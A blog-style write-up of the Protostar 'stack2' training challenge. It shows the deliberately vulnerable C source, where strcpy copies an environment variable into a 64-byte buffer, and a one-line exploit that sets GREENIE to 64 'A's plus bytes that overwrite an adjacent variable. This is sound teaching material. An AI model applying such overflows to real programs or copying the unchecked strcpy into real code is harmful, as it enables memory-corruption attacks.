---
layout: post
title: "Protostar stack02 writeup"
tags: [protostar, pwn]
comments: false
---

We are given a source code for this challenge

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

For this challenge, you just need to set up an environment variable that contains 64 A's + \x0a\x0d\x0a\x0d
then if you run the program, the program will get the values in teh environment variable using getenv, actually 
getenv gets the address not the actual value but because of that the source code is using pointer, it will save the value in. Which will then copy all of the values in by using strcpy and by overflowing buffer then putting \x0a\x0d\x0a\x0d which will be 0x0d0a0d0a and match the if statement.

```
root@protostar:/opt/protostar/bin# export GREENIE=$(python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"')
root@protostar:/opt/protostar/bin# ./stack2
you have correctly modified the variable
```